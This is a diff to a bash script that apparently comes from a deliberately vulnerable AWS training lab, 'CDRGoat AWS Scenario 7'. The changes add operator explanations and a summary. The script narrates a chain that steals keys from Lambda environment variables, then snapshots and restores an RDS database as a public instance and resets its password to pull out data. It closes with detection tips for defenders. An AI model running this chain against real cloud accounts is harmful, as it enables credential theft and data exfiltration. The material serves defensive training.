@@ -43,7 +43,7 @@ spin_start() {
 spin_stop() { [ -n "${SPIN_PID}" ] && kill "${SPIN_PID}" >/dev/null 2>&1 || true; SPIN_PID=""; printf "\r%*s\r" 120 ""; }
 
 banner() {
-  printf "%s%s%s\n" "${BOLD}${CYAN}" "===            StreamGoat - Scenario 7              ===" "${RESET}"
+  printf "%s%s%s\n" "${BOLD}${CYAN}" "===           CDRGoat AWS - Scenario 7               ===" "${RESET}"
   printf "%sThis automated attack script will:%s\n" "${GREEN}" "${RESET}"
   printf "  • Step 1. Configuring AWS credentials\n"
   printf "  • Step 2. Permission enumeration for leaked credentials\n"
@@ -108,6 +108,15 @@ while :; do
 done
 printf "\n"
 read -r -p "Step 1 is completed. Press Enter to proceed (or Ctrl+C to abort)..." _ || true
+
+#############################################
+# Operator explanation
+#############################################
+printf "\n%s%s%s\n\n" "${BOLD}" "---  OPERATOR EXPLANATION  ---" "${RESET}"
+printf "We configured AWS CLI with leaked IAM user credentials.\n\n"
+printf "This scenario demonstrates how Lambda environment variables\n"
+printf "can leak credentials, enabling RDS snapshot attacks.\n\n"
+
 #############################################
 # Step 2. Permission enumeration for leaked credentials
 #############################################
@@ -150,6 +159,16 @@ try "CloudTrail DescribeTrails" aws cloudtrail describe-trails --profile "$PROFI
 printf "\nOK, it seems our permissions are quite limited. Let's try to get some more info about our user...\n"
 printf "\n"
 read -r -p "Step 2 is completed. Press Enter to proceed (or Ctrl+C to abort)..." _ || true
+
+#############################################
+# Operator explanation
+#############################################
+printf "\n%s%s%s\n\n" "${BOLD}" "---  OPERATOR EXPLANATION  ---" "${RESET}"
+printf "Permission enumeration shows ${MAGENTA}Lambda ListFunctions${RESET} succeeded.\n\n"
+printf "Lambda functions may contain sensitive information:\n"
+printf "  • Credentials in environment variables\n"
+printf "  • Database connection strings\n"
+printf "  • API keys and secrets\n\n"
 
 #############################################
 # Tempdir + cleanup helpers (global for script)
@@ -276,7 +295,16 @@ for fn in $LAMBDA_NAMES; do
 done
 
 
-printf "\nThe plan is:\n    1. Create snapshot of RDS instanse\n    2. Create new publicly-accessible RDS instance based on snapshot\n    3. Modify master password\n    4. Connect and exfiltrate data\n\n"
+#############################################
+# Operator explanation
+#############################################
+printf "\n%s%s%s\n\n" "${BOLD}" "---  OPERATOR EXPLANATION  ---" "${RESET}"
+printf "Lambda GetFunction exposed environment variables:\n"
+printf "  • ${MAGENTA}STREAMGOAT_AK / STREAMGOAT_SK${RESET}: AWS access keys!\n"
+printf "  • ${MAGENTA}RDS_IDENTIFIER${RESET}: Target database identifier\n\n"
+printf "The Lambda handles RDS backup/restore, explaining its RDS permissions.\n\n"
+
+printf "\nThe plan is:\n    1. Create snapshot of RDS instance\n    2. Create new publicly-accessible RDS instance based on snapshot\n    3. Modify master password\n    4. Connect and exfiltrate data\n\n"
 read -r -p "Step 3 is completed. Press Enter to proceed (or Ctrl+C to abort)..." _ || true
 
 #############################################
@@ -388,7 +416,7 @@ ENDPOINT=$(aws rds describe-db-instances \
 info "Testing connectivity to RDS instance using new credentials..."
 if command -v mysql >/dev/null 2>&1; then
   if mysql -h "$ENDPOINT" -u "$ADMIN_USERNAME" -p"$NEW_ADMIN_PASSWORD" -e "SELECT VERSION();" >/dev/null 2>&1; then
-    ok "4. Successfully connected to RDS using updated password. We can successfuly send query: ${YELLOW}SELECT VERSION();${RESET}"
+    ok "4. Successfully connected to RDS using updated password. We can successfully send query: ${YELLOW}SELECT VERSION();${RESET}"
     mysql -h "$ENDPOINT" -u "$ADMIN_USERNAME" -p"$NEW_ADMIN_PASSWORD" -e "SELECT VERSION();" 2>/dev/null
   else
     err "4. Failed to connect to RDS with new credentials"
@@ -398,7 +426,18 @@ else
 fi
 
 
-read -r -p "The scenario is successfuly completed. Press Enter to continue..." _ || true
+#############################################
+# Operator explanation
+#############################################
+printf "\n%s%s%s\n\n" "${BOLD}" "---  OPERATOR EXPLANATION  ---" "${RESET}"
+printf "We executed the RDS snapshot attack:\n"
+printf "  1. Created snapshot of production database\n"
+printf "  2. Restored to new publicly-accessible instance\n"
+printf "  3. Reset master password to known value\n"
+printf "  4. Connected and exfiltrated data\n\n"
+printf "The original database is untouched - this is a stealth technique.\n\n"
+
+read -r -p "The scenario is successfully completed. Press Enter to continue..." _ || true
 
 
 #############################################
@@ -480,3 +519,28 @@ final_cleanup() {
 
 # run cleanup on script exit (also on ctrl-c)
 trap 'final_cleanup' EXIT
+
+################################################################################
+# Final Summary
+################################################################################
+printf "\n%s%s%s\n" "${BOLD}${CYAN}" "===  Attack Simulation Complete  ===" "${RESET}"
+
+printf "\n%s%s%s\n" "${BOLD}${GREEN}" "Attack chain executed:" "${RESET}"
+printf "  1. Validated leaked IAM user credentials\n"
+printf "  2. Enumerated Lambda functions\n"
+printf "  3. Extracted AWS credentials from Lambda environment variables\n"
+printf "  4. Pivoted to Lambda's RDS-privileged credentials\n"
+printf "  5. Created RDS snapshot of production database\n"
+printf "  6. Restored to new publicly-accessible instance\n"
+printf "  7. Reset master password and connected to exfiltrate data\n\n"
+
+printf "%s%s%s\n" "${BOLD}${RED}" "Impact:" "${RESET}"
+printf "  • Complete RDS database compromise\n"
+printf "  • Credential extraction from Lambda environment\n"
+printf "  • Stealth data exfiltration (production DB untouched)\n\n"
+
+printf "%s\n" "Defenders should monitor for:"
+printf "  • Lambda GetFunction calls (exposes env vars)\n"
+printf "  • RDS snapshot creation outside backup windows\n"
+printf "  • RestoreDBInstance with PubliclyAccessible=true\n"
+printf "  • ModifyDBInstance password changes\n\n"
